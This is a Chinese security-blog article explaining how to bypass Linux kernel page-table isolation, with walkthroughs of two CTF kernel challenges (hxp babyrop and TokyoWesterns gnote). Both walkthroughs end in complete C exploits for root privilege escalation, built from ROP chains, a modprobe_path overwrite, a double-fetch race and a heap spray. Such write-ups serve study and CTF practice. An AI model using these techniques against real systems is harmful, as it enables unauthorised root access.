# Linux Kernel KPTI保护绕过

阅读量 **273942**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-06-02 17:30:42

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t012304634c24532623.jpg)

> 最近做题遇到一种错误，当执行ROP返回用户态时会报一个段错误。后面了解到是因为内核开启了KPTI保护。于是本篇文章主要讲述针对这种保护的绕过方法。

## KPTI简介

在没有开启
`KPTI`保护的内核中，每当执行用户空间代码时，`Linux`会在其分页表中保留整个内核内存的映射，即用户地址空间和内核地址空间将使用同一个页全局目录表，并保护其访问。

`KPTI(Kernel page-table
isolation)`，即内核页表隔离。通过把进程页表按照用户空间和内核空间隔离成两块来防止内核页表泄露。可以在`-append`选项下添加`kpti=1`或`nopti`来启用或禁用它。

而在开启了 `KPTI`保护的内核里，用户态页表包含了用户空间，其只含有一个用于处理中断的`kernel mapping
PGD`。当用户空间访问内核时，会先陷入中断，进入处理中断的 `trampoline mapping`，该中断处理程序会建立一个正常的的`kernel
mapping`的映射。

而为了实现 `PGD`的切换，内核增加了一组宏用来在进程进行用户态、内核态切换时进行页表切换。一个进程的内核态`PGD(4k)`和用户态
`PGD(4K)`一起形成了一个`8K`的 `PGD`。当中断发生时，内核使用切换
`CR3`寄存器来实现从用户态地址空间切换到内核态的地址空间。`CR3`的 `bit47-bit11`为 `PGD`的物理地址，最低为
`bit12`用于进行 `PGD`切换；`bit12=0`为内核态`PGD`，`bit12=1`为用户态 `PGD`。

`CR3`的 `bit0-bit11`为 `asid(Address Space Identifier)`，`asid`也分为 内核态和用户态，最高位
`bit11`来进行 `asid`切换；`bit11=0`为内核态 `asid`，`bit11=1`为用户态 `asid`。

![](https://p2.ssl.qhimg.com/t01219f81626fe6310c.png)

那么一旦开启了 `KPTI`,由于内核态和用户态的页表不同，所以如果使用 `ret2user`或内核执行
`ROP`返回用户态时，由于内核态无法确定用户态的页表，所以会报出一个段错误。

## KPTI绕过

了解了 `KPTI`的特性之后，这里主要有2种思路来进行绕过。

###  swap CR3

在一个开启 `KPTI`内核中会调用 `SWITCH_KERNEL_CR3_NO_STACK`函数来从用户态进入内核态，关键代码如下所示：

    
    
    mov     rdi, cr3
    nop
    nop
    nop
    nop
    nop
    and     rdi, 0xFFFFFFFFFFFFE7FF
    mov     cr3, rdi
    

该代码就是将 `CR3`的 第12位与第13位清零。而页表的第12位在 `CR4`寄存器的 `PCIDE`位开启的情况下，都是保留给
`OS`使用，这里只关心 `13`位置零即可，也就相当于将 `CR3-0x1000`。

而在从内核态返回用户态时会调用 `SWITCH_USER_CR3`宏来切换 `CR3`，如下所示：

    
    
    mov     rdi, cr3
    or      rdi, 1000h
    mov     cr3, rdi
    

所以，这里第一种方法就很类似绕过 `smep`的方法，即利用内核中已有 `gadget`来在返回用户态执行 `iretq/sysret`之前 设置
`cr3`。寻找 到 能够将 `cr3`寄存器 与 `0x1000`执行 或运算即可。

###  swapgs_restore_regs_and_return_to_usermode

第二种方法即直接利用 `swapgs_restore_regs_and_return_to_usermode`这个函数内的
`gadget`。其汇编代码如下：

    
    
    swapgs_restore_regs_and_return_to_usermode
    
    .text:FFFFFFFF81600A34 41 5F                          pop     r15
    .text:FFFFFFFF81600A36 41 5E                          pop     r14
    .text:FFFFFFFF81600A38 41 5D                          pop     r13
    .text:FFFFFFFF81600A3A 41 5C                          pop     r12
    .text:FFFFFFFF81600A3C 5D                             pop     rbp
    .text:FFFFFFFF81600A3D 5B                             pop     rbx
    .text:FFFFFFFF81600A3E 41 5B                          pop     r11
    .text:FFFFFFFF81600A40 41 5A                          pop     r10
    .text:FFFFFFFF81600A42 41 59                          pop     r9
    .text:FFFFFFFF81600A44 41 58                          pop     r8
    .text:FFFFFFFF81600A46 58                             pop     rax
    .text:FFFFFFFF81600A47 59                             pop     rcx
    .text:FFFFFFFF81600A48 5A                             pop     rdx
    .text:FFFFFFFF81600A49 5E                             pop     rsi
    .text:FFFFFFFF81600A4A 48 89 E7                       mov     rdi, rsp    
    .text:FFFFFFFF81600A4D 65 48 8B 24 25+                mov     rsp, gs: 0x5004//从此处开始执行
    .text:FFFFFFFF81600A56 FF 77 30                       push    qword ptr [rdi+30h]
    .text:FFFFFFFF81600A59 FF 77 28                       push    qword ptr [rdi+28h]
    .text:FFFFFFFF81600A5C FF 77 20                       push    qword ptr [rdi+20h]
    .text:FFFFFFFF81600A5F FF 77 18                       push    qword ptr [rdi+18h]
    .text:FFFFFFFF81600A62 FF 77 10                       push    qword ptr [rdi+10h]
    .text:FFFFFFFF81600A65 FF 37                          push    qword ptr [rdi]
    .text:FFFFFFFF81600A67 50                             push    rax
    .text:FFFFFFFF81600A68 EB 43                          nop
    .text:FFFFFFFF81600A6A 0F 20 DF                       mov     rdi, cr3
    .text:FFFFFFFF81600A6D EB 34                          jmp     0xFFFFFFFF81600AA3
    
    .text:FFFFFFFF81600AA3 48 81 CF 00 10+                or      rdi, 1000h
    .text:FFFFFFFF81600AAA 0F 22 DF                       mov     cr3, rdi
    .text:FFFFFFFF81600AAD 58                             pop     rax
    .text:FFFFFFFF81600AAE 5F                             pop     rdi
    .text:FFFFFFFF81600AAF FF 15 23 65 62+                call    cs: SWAPGS
    .text:FFFFFFFF81600AB5 FF 25 15 65 62+                jmp     cs: INTERRUPT_RETURN
    
    _SWAPGS
    .text:FFFFFFFF8103EFC0 55                             push    rbp
    .text:FFFFFFFF8103EFC1 48 89 E5                       mov     rbp, rsp
    .text:FFFFFFFF8103EFC4 0F 01 F8                       swapgs
    .text:FFFFFFFF8103EFC7 5D                             pop     rbp
    .text:FFFFFFFF8103EFC8 C3                             retn
    
    
    _INTERRUPT_RETURN
    .text:FFFFFFFF81600AE0 F6 44 24 20 04                 test    byte ptr [rsp+0x20], 4
    .text:FFFFFFFF81600AE5 75 02                          jnz     native_irq_return_ldt
    .text:FFFFFFFF81600AE7 48 CF                          iretq
    

只需要从上述 `mov rsp, gs: 0x5004`代码处开始执行，就会依次执行 绕过 `kpti`和
`iretq/sysret`两种功能，自动返回用户态。

## 2020-hxp-babyrop

###  漏洞分析

    
    
    ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off)
    {
      unsigned __int64 v4; // rdx
      ssize_t v5; // rbx
      int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF
      unsigned __int64 v8; // [rsp+80h] [rbp-20h]
    
      _fentry__(f, data);
      v5 = v4;
      v8 = __readgsqword(0x28u);
      if ( v4 > 0x1000 )
      {
        _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL, v4);
        BUG();
      }
      _check_object_size(hackme_buf, v4, 0LL);
      if ( copy_from_user(hackme_buf, data, v5) )
        return -14LL;
      _memcpy(tmp, hackme_buf);
      return v5;
    }
    

程序漏洞十分明显，`write`函数存在一个栈溢出漏洞。

    
    
    ssize_t __fastcall hackme_read(file *f, char *data, size_t size, loff_t *off)
    {
      unsigned __int64 v4; // rdx
      unsigned __int64 v5; // rbx
      bool v6; // zf
      ssize_t result; // rax
      int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF
      unsigned __int64 v9; // [rsp+80h] [rbp-20h]
    
      _fentry__(f, data);
      v5 = v4;
      v9 = __readgsqword(0x28u);
      _memcpy(hackme_buf, tmp);
      if ( v5 > 0x1000 )
      {
        _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL, v5);
        BUG();
      }
      _check_object_size(hackme_buf, v5, 1LL);
      v6 = copy_to_user(data, hackme_buf, v5) == 0;
      result = -14LL;
      if ( v6 )
        result = v5;
      return result;
    }
    

`read`函数能够读取数据。

###  利用分析

虽然漏洞很简单，但是这道题却开启了各种保护，除了常见的`smep、smap`，这道题还开了两个特别的保护 `FG_KASLR`和 `KPTI`。`FG-KASLR`是函数级别的细粒度
`KASLR`，它会使内核中的部分函数的地址与内核基地址的偏移发生随机改变，这将会使得`ROP`攻击更难找到可以利用的内核地址。而`KPTI`则是上文所讲的，可以在内核执行`ROP`返回用户态时报出一个段错误。

所以，这里首先需要找到稳定的可以利用的内核 `gadget`，其次是要绕过 `KPTI`。这里选择使用 覆写 `modprobe_path`来提权。

首先上面讲到 `FG-KASLR`并不是使所有的内核函数的偏移全部随机化，而是使部分危险函数的偏移随机化，例如 `prepare_kernel_cred`和
`commit_creds`函数。然后对于部分函数其偏移仍然是不变化的，例如这里调试发现对于 `modprobe_path`的地址和
`memcpy`函数就不发生变化。所以就可以从这部分不发生变化的函数里寻找可用的 `gadget`，其次利用这些不变的函数来首先提权。

这里先利用 `read`函数的越界读从栈上读取一个 偏移不变的内核地址，以此来计算得到内核基址。

然后使用 `memcpy`函数来直接覆盖 `modprobe_path`的地址。同时，需要注意这里开启了 `smap`，内核不能使用用户态数据，所以覆写
`modprobe_path` 时需要将目标字符串 `/tmp/chmod.sh`部署到内核栈上。 `ROP`执行如下：

    
    
    p_rdi_r,
    modprobe_path,
    p_rsi_r,
    target_addr,
    p_rdx_r,
    0x20,
    memcpy_addr,
    

然后就要考虑绕过 `KPTI`保护。这里可以发现
`swapgs_restore_regs_and_return_to_usermode`函数的偏移也是不变的。所以这里可以直接利用这个函数，按照上述方法直接绕过
`KPTI`保护，返回到用户态。

    
    
    / # cat /tmp/kallsyms | grep swapgs_restore_regs_and_return_to_usermode 
    ffffffffb9800f10 T swapgs_restore_regs_and_return_to_usermode           
    
    pwndbg> x/28i 0xffffffffb9800f10
       0xffffffffb9800f10:  pop    r15
       0xffffffffb9800f12:  pop    r14
       0xffffffffb9800f14:  pop    r13
       0xffffffffb9800f16:  pop    r12
       0xffffffffb9800f18:  pop    rbp
       0xffffffffb9800f19:  pop    rbx
       0xffffffffb9800f1a:  pop    r11
       0xffffffffb9800f1c:  pop    r10
       0xffffffffb9800f1e:  pop    r9
       0xffffffffb9800f20:  pop    r8
       0xffffffffb9800f22:  pop    rax
       0xffffffffb9800f23:  pop    rcx
       0xffffffffb9800f24:  pop    rdx
       0xffffffffb9800f25:  pop    rsi
       0xffffffffb9800f26:  mov    rdi,rsp                    
       0xffffffffb9800f29:  mov    rsp,QWORD PTR gs:0x6004//从此处开始利用
       0xffffffffb9800f32:  push   QWORD PTR [rdi+0x30]
       0xffffffffb9800f35:  push   QWORD PTR [rdi+0x28]
       0xffffffffb9800f38:  push   QWORD PTR [rdi+0x20]
       0xffffffffb9800f3b:  push   QWORD PTR [rdi+0x18]
       0xffffffffb9800f3e:  push   QWORD PTR [rdi+0x10]
       0xffffffffb9800f41:  push   QWORD PTR [rdi]
       0xffffffffb9800f43:  push   rax
       0xffffffffb9800f44:  xchg   ax,ax
       0xffffffffb9800f46:  mov    rdi,cr3
       0xffffffffb9800f49:  jmp    0xffffffffb9800f7f
       0xffffffffb9800f4b:  mov    rax,rdi
       0xffffffffb9800f4e:  and    rdi,0x7ff
    

所以后续的 `ROP`布置如下：

    
    
    swapgs_restore_regs_and_return_to_usermode+0x19,
    0,
    0,
    &get_shell,
    user_cs,
    user_rflags,
    user_sp,
    user_ss
    

最终的 `EXP`如下：

    
    
    // gcc -static -pthread exp.c -g -o exp
    #include <stdlib.h>
    #include <string.h>
    #include <stdio.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <pthread.h>
    #include <errno.h>
    #include <poll.h>
    #include <arpa/inet.h>
    #include <sys/wait.h>
    #include <sys/ioctl.h>
    #include <sys/mman.h>
    #include <sys/ipc.h>
    #include <sys/shm.h>
    #include <sys/msg.h>
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <sys/syscall.h>
    #include <sys/un.h>
    #include <sys/xattr.h>
    #include <linux/userfaultfd.h>
    
    
    int fd = 0;
    char bf[0x100] = { 0 };
    size_t fault_ptr;
    size_t fault_len = 0x4000;
    size_t kernel_base = 0x0;
    size_t offset = 0x13be80;
    size_t victim_fd = 0;
    size_t stack_pivot = 0x02cae0;
    size_t prepare_kernel_cred = 0x069e00;
    size_t commit_creds = 0x2c6e50;
    size_t p_rdi_r = 0x38a0;
    size_t p_rsi_rdx_rcx_rbp_r = 0x4855;
    size_t p_rsi_r = 0x0;
    size_t mov_rdi_rax_p_rbp_r = 0x01877f;
    size_t swapgs = 0x03ef24;
    size_t iretq = 0x200f10+0x16;
    size_t kpti_bypass = 0x200f10+0x19;
    size_t modprobe_path = 0x1061820;
    size_t user_cs, user_ss, user_sp, user_rflags;
    size_t memcpy_addr = 0xdd60;
    
    void Err(char* buf){
        printf("%s Error\n", buf);
        exit(-1);
    }
    
    static void save_state() {
      asm("movq %%cs, %0\n"
          "movq %%ss, %1\n"
          "pushfq\n"
          "popq %2\n"
          : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
          :: "memory");
    }
    
    void get_shell(){
        if(!getuid()){
            puts("Root Now!");
            system("/tmp/ll");
            system("cat /flag");
        }
    }
    
    int main(){
        system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/chmod.sh");
        system("chmod +x /tmp/chmod.sh");
        system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/ll");
        system("chmod +x /tmp/ll");
        save_state();
        fd = open("/dev/hackme", O_RDWR);
        if(fd < 0){
            Err("Open dev");
        }
    
        char* buf= malloc(0x1000);
        memset(buf, "a", 0x1000);
    
        read(fd, buf, 0x150);
        kernel_base = *(size_t*)(buf+0x130) - 0xa157;
        printf("kernel_base: 0x%llx\n", kernel_base);
        size_t canary = *(size_t*)(buf+0x80);
        printf("canary: 0x%llx\n", canary);
        size_t stack_addr = *(size_t*)(buf);
        printf("stack_addr: 0x%llx\n", stack_addr);
    
        memcpy_addr += kernel_base;
        p_rdi_r += kernel_base;
        modprobe_path += kernel_base;
        p_rsi_rdx_rcx_rbp_r += kernel_base;
        kpti_bypass += kernel_base;
        printf("mod: 0x%llx\n", modprobe_path);
    
        size_t rop[0x100] = { 0 };
        int i = 0;
        memset(rop, '\x00', 0x20);
        rop[i++] = canary;
        rop[i++] = canary;
        rop[i++] = canary;
    
        strncpy(rop+3, "/tmp/chmod.sh\0\n", 0x20);
        printf("rop: %s\n",rop+0x18);
        for(i=7; i < 20; i++ ){
            rop[i] = canary;
        }
    
        rop[i++] = p_rdi_r;
        rop[i++] = modprobe_path;
        rop[i++] = 0;
        rop[i++] = p_rsi_rdx_rcx_rbp_r;
        rop[i++] = stack_addr;
        rop[i++] = 0x20;
        rop[i++] = 0;
        rop[i++] = 0;
        rop[i++] = memcpy_addr;
    
        rop[i++] = kpti_bypass;
        rop[i++] = 0;
        rop[i++] = 0;
        rop[i++] = &get_shell;
        rop[i++] = user_cs;
        rop[i++] = user_rflags;
        rop[i++] = user_sp;
        rop[i++] = user_ss;
    
        write(fd, rop, 0x100);
    
        return 0;
    
    }
    

## 2019-TokyoWesterns-gnote

###  漏洞分析

题目首先就给了源码，从源码中可以直接看出来就两个功能，一个是 `write`，使用了一个 `siwtch
case`结构，实现了两个功能，一是`kmalloc`申请堆块，一个是 `case 5`选择堆块。

    
    
    ssize_t gnote_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
    {
      unsigned int index;
      mutex_lock(&lock);
      /*
       * 1. add note
       * 2. edit note
       * 3. delete note
       * 4. copy note
       * 5. select note
       * No implementation :(
       */
      switch(*(unsigned int *)buf){
        case 1:
          if(cnt >= MAX_NOTE){
            break;
          }
          notes[cnt].size = *((unsigned int *)buf+1);
          if(notes[cnt].size > 0x10000){
            break;
          }
          notes[cnt].contents = kmalloc(notes[cnt].size, GFP_KERNEL);
          cnt++;
          break;
        case 2:
          printk("Edit Not implemented\n");
          break;
        case 3:
          printk("Delete Not implemented\n");
          break;
        case 4:
          printk("Copy Not implemented\n");
          break;
        case 5:
          index = *((unsigned int *)buf+1);
          if(cnt > index){
            selected = index;
          }
          break;
      }
      mutex_unlock(&lock);
      return count;
    }
    

还有一个功能就是 `read`，读取堆块中的数据。

    
    
    ssize_t gnote_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos)
    {
      mutex_lock(&lock);
      if(selected == -1){
        mutex_unlock(&lock);
        return 0;
      }
      if(count > notes[selected].size){
        count = notes[selected].size;
      }
      copy_to_user(buf, notes[selected].contents, count);
      selected = -1;
      mutex_unlock(&lock);
      return count;
    }
    

这题的漏洞出的十分隐蔽了，`write`功能中是通过 `switch case`实现跳转，在汇编中 `switch case`是通过 `swicth
table`跳转表实现的，即看如下汇编：

    
    
    .text:0000000000000019                 cmp     dword ptr [rbx], 5 ; switch 6 cases
    .text:000000000000001C                 ja      short def_20    ; jumptable 0000000000000020 default case
    .text:000000000000001E                 mov     eax, [rbx]
    .text:0000000000000020                 mov     rax, ds:jpt_20[rax*8] ; switch jump
    .text:0000000000000028                 jmp     __x86_indirect_thunk_rax
    

会先判断 跳转`id`是否大于最大的跳转 路径 5，如果不大于再使用 `ds:jpt_20`这个跳转表来获得跳转的地址。这里可以看到这个 `id`，首先是从
`rbx`所在地址中的值与5比较，然后将 `rbx`中的值复制给 `eax`，通过 `eax`来跳转。那么存在一种情况，当 `[rbx]`与
`5`比较通过后，有另一个进程修改了 `rbx`的值 将其改为了 一个大于跳转表的值，这里由于
`rbx`的值是用户态传入的参数，所以是能够被用户态所修改的。随后系统将 `rbx`的值传给 `eax`，此时 `eax`大于 5，即可实现
劫持控制流到一个 较大的地址。这里存在一个 `double fetch`洞。

###  利用分析

**泄露地址**

这里泄露地址的方法，感觉在真实漏洞中会用到，即利用 `tty_struct`中的指针来泄露地址。

可以先打开一个 `ptmx`，然后 `close`掉。随后使用 `kmalloc`申请与 `tty_struct`大小相同的 `slub`，这样就能将
`tty_struct`结构体申请出来。然后利用 `read`函数读取其中的指针，来泄露地址。

**double-fetch堆喷**

上面已经分析了可以利用 `double-fetch`来实现任意地址跳转。那么这里我们跳转到哪个地址呢，跳转后又该怎么执行呢？

这里我们首先选择的是用户态空间，因为这里只有用户态空间的内容是我们可控的，且未开启
`smap`内核可以访问用户态数据。我们可以考虑在用户态通过堆喷布置大量的 `gadget`，使得内核态跳转时一定能落到
`gadget`中。那么这里用户态空间选择什么地址呢？

这里首先分析 上面 `swicth_table`是怎么跳的，这里 `jmp_table+(rax*8)`，当我们的 `rax`输入为
`0x8000200`，假设内核基址为 `0xffffffffc0000000`，则最终访问的地址将会溢出
`(0xffffffffc0000000+0x8000200*8 == 0x1000)`，那么最终内核最终将能够访问到 `0x1000`。

由于内核模块加载的最低地址是 `0xffffffffc0000000`，通常是基于这个地址有最多
`0x1000000`大小的浮动，所以这里我们的堆喷页面大小 肯定要大于 `0x1000000`，才能保证内核跳转一定能跳到 `gadget`
。而一般未开启 `pie`的用户态程序地址空间为 `0x400000`，如果我们选择低于 `0x400000`的地址开始堆喷，那么最终肯定会对
用户态程序，动态库等造成覆盖。 所以这里我们最佳的地址是 `0x8000000`，我们的输入为：

`(0xffffffffc0000000+0x9000000*8 == 0x8000000)`

那么我们选择 `0x8000000`地址，并堆喷 `0x1000000`大小的 `gadget`。这里的思路是最好确保内核态执行执行了
`gadget`后，能被我们劫持到位于用户态空间的的 `ROP`上。所以这里选用的 `gadget`是 `xchg eax, esp`，会将
`RAX`寄存器的 低 `4byte`切换进 `esp`寄存器，同时 `rsp`拓展位的高32位清0，这样就切换到用户态的栈了。

然后 `ROP`部署的地址需要根据 `xchg eax, esp`这个`gadget`的地址来计算，通过在 `xchg_eax_rsp_r_addr &
0xfffff000`处开始分配空间，在 `xchg_eax_rsp_r_addr & 0xffffffff`处存放内核 `ROP`链，就可以通过
`ROP`提权。

**绕过KPTI**

这里也开启了 `KPTI`保护，然而这里可以很方便的找到 `swap CR3`的 `gadget`：

    
    
    pwndbg> x/25xi 0xffffffffa5800000+0x600116
       0xffffffffa5e00116:  mov    rdi,cr3
       0xffffffffa5e00119:  jmp    0xffffffffa5e0014f
       0xffffffffa5e0011b:  mov    rax,rdi
       0xffffffffa5e0011e:  and    rdi,0x7ff
       0xffffffffa5e00125:  bt     QWORD PTR gs:0x1d996,rdi
       0xffffffffa5e0012f:  jae    0xffffffffa5e00140
       0xffffffffa5e00131:  btr    QWORD PTR gs:0x1d996,rdi
       0xffffffffa5e0013b:  mov    rdi,rax
       0xffffffffa5e0013e:  jmp    0xffffffffa5e00148
       0xffffffffa5e00140:  mov    rdi,rax
       0xffffffffa5e00143:  bts    rdi,0x3f
       0xffffffffa5e00148:  or     rdi,0x800
       0xffffffffa5e0014f:  or     rdi,0x1000
       0xffffffffa5e00156:  mov    cr3,rdi
       0xffffffffa5e00159:  pop    rax
       0xffffffffa5e0015a:  pop    rdi
       0xffffffffa5e0015b:  pop    rsp
       0xffffffffa5e0015c:  swapgs
       0xffffffffa5e0015f:  sysretq
    

最终将会执行如下代码：

    
    
    mov    rdi,cr3;
    jmp    0xffffffffa5e0014f;
    or     rdi,0x1000;
    mov    cr3,rdi;
    pop    rax;
    pop    rdi;
    pop    rsp;
    swapgs;
    sysretq;
    

可以看到将 `CR3`与`0x1000`进行或运算，也就完成了 `CR3`寄存器的修改。  
`EXP`如下：

    
    
    //$ gcc -O3 -pthread -static -g -masm=intel ./exp.c -o exp
    #include <pthread.h>
    #include <stdlib.h>
    #include <stdio.h>
    #include <stdint.h>
    #include <string.h>
    #include <sys/ioctl.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <sys/uio.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/wait.h>
    #include <sys/mman.h>
    #include <syscall.h>
    #include <sys/ipc.h>
    #include <sys/sem.h>
    #include <sys/user.h>
    
    size_t user_cs, user_ss, user_rflags, user_sp;
    size_t prepare_kernel =  0x69fe0;
    size_t commit_creds = 0x69df0;
    size_t p_rdi_r = 0x1c20d;
    size_t mv_rdi_rax_p_r = 0x21ca6a;
    size_t p_rcx_r = 0x37523;
    size_t p_r11_p_rbp_r = 0x1025c8;
    size_t kpti_ret = 0x600a4a;
    size_t iretq = 0x0;
    size_t modprobe_path = 0x0;
    size_t xchg_eax_rsp_r = 0x1992a;
    size_t xchg_cr3_sysret = 0x600116;
    int fd;
    int istriggered = 0;
    typedef struct Knote{
        unsigned int ch;
        unsigned int size;
    }gnote;
    
    void Err(char* buf){
        printf("%s Error\n");
        exit(-1);
    }
    
    void getshell(){
        if(!getuid()){
            system("/bin/sh");
        }
        else{
            err("Not root");
        }
    }
    
    void shell()
    {
        istriggered =1;
        puts("Get root");
      char *shell = "/bin/sh";
      char *args[] = {shell, NULL};
      execve(shell, args, NULL);
    }
    
    void getroot(){
        char* (*pkc)(int) = prepare_kernel;
        void (*cc)(char*) = commit_creds;
        (*cc)((*pkc)(0));
    }
    
    void savestatus(){
           __asm__("mov user_cs,cs;"
               "mov user_ss,ss;"
               "mov user_sp,rsp;"
               "pushf;"            //push eflags
               "pop user_rflags;"
              );
    }
    
    void Add(unsigned int sz){
        gnote gn;
        gn.ch = 1;
        gn.size = sz;
        if(-1 == write(fd, &gn, sizeof(gnote))){
            Err("Add");
        }
    }
    
    void Select(unsigned int idx){
        gnote gn;
        gn.ch = 5;
        gn.size = idx;
        if(-1 == write(fd, &gn, sizeof(gnote))){
            Err("Select");
        }
    }
    
    void Output(char* buf, size_t size){
        if(-1 == read(fd, buf, size)){
            Err("Read");
        }
    }
    
    void LeakAddr(){
        int fdp=open("/dev/ptmx", O_RDWR|O_NOCTTY);
        close(fdp);
        sleep(1); // trigger rcu grace period
    
        Add(0x2e0);
        Select(0);
        char buffer[0x500] = { 0 };
        Output(buffer, 0x2e0);
    
        size_t vmlinux_addr = *(size_t*)(buffer+0x18)- 0xA35360;
        printf("vmlinux_addr: 0x%llx\n", vmlinux_addr);
    
        prepare_kernel += vmlinux_addr;
        commit_creds += vmlinux_addr;
        p_rdi_r += vmlinux_addr;
        xchg_eax_rsp_r += vmlinux_addr;
        xchg_cr3_sysret += vmlinux_addr;
        mv_rdi_rax_p_r += vmlinux_addr;
        p_rcx_r += vmlinux_addr;
        p_r11_p_rbp_r += vmlinux_addr;
        kpti_ret += vmlinux_addr;
    
        printf("p_rdi_r: 0x%llx, xchg_eax_rsp_r: 0x%llx\n", p_rdi_r, xchg_eax_rsp_r);
    getchar();
        puts("Leak addr OK");
    }
    
    void HeapSpry(){
        char* gadget_mem = mmap((void*)0x8000000, 0x1000000, PROT_READ|PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1,0);
        unsigned long* gadget_addr = (unsigned long*)gadget_mem;
    
        for(int i=0; i < (0x1000000/8); i++){
            gadget_addr[i] = xchg_eax_rsp_r;
        } 
    
    }
    
    void Prepare_ROP(){
        char* rop_mem = mmap((void*)(xchg_eax_rsp_r&0xfffff000), 0x2000, PROT_READ|PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
        unsigned long* rop_addr = (unsigned long*)(xchg_eax_rsp_r & 0xffffffff);
        int i = 0;
        rop_addr[i++] = p_rdi_r;
        rop_addr[i++] = 0;
        rop_addr[i++] = prepare_kernel;
        rop_addr[i++] = mv_rdi_rax_p_r;
        rop_addr[i++] = 0;
        rop_addr[i++] = commit_creds;
    
        // xchg_CR3_sysret
        rop_addr[i++] = kpti_ret;
        rop_addr[i++] = 0;
        rop_addr[i++] = 0;
        rop_addr[i++] = &shell;
        rop_addr[i++] = user_cs;
        rop_addr[i++] = user_rflags;
        rop_addr[i++] = user_sp;
        rop_addr[i++] = user_ss;
    }
    
    void race(void *s){
        gnote *d=s;
        while(!istriggered){
            d->ch = 0x9000000; // 0xffffffffc0000000 + (0x8000000+0x1000000)*8 = 0x8000000
            puts("[*] race ...");
        }
    }
    
    
    void Double_Fetch(){
        gnote gn;
        pthread_t pthread;
        gn.size = 0x10001;
        pthread_create(&pthread,NULL, race, &gn);
        for (int j=0; j< 0x10000000000; j++)
        {
            gn.ch = 1;
            write(fd, (void*)&gn, sizeof(gnote));
        }
        pthread_join(pthread, NULL);
    }
    
    int main(){
        savestatus();
    
        fd=open("proc/gnote", O_RDWR);
        if (fd<0)
        {
            puts("[-] Open driver error!");
            exit(-1);
        }
    
        LeakAddr();
    
        HeapSpry();
    
        Prepare_ROP();
    
        Double_Fetch();
    
        return 0;
    }
    

## 参考

[KERNEL PWN状态切换原理及KPTI绕过](https://bbs.pediy.com/thread-258975.htm)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Aone** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/240006](/post/id/240006)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [提权](/tag/提权)
  * [Kernel](/tag/Kernel)
  * [KPTI](/tag/KPTI)

 **+1** __5赞

 __收藏

![](https://p2.ssl.qhimg.com/t010b42f3d8958ad2d2.png) Aone

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

